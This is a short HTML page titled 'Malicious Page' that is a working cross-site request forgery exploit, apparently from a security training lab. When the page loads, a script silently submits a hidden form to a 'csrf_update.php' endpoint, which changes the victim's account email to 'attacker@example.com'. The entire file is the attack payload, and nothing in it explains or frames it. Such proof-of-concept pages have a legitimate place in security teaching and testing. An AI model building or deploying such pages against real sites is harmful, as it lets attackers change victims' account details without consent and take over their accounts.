<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Malicious Page</title>
</head>
<body onload="document.forms[0].submit()">

<form method="POST" action="/devinci-cracks/view/csrf_update.php" style="display:none;">
    <input type="email" name="email" value="attacker@example.com">
</form>

</body>
</html>
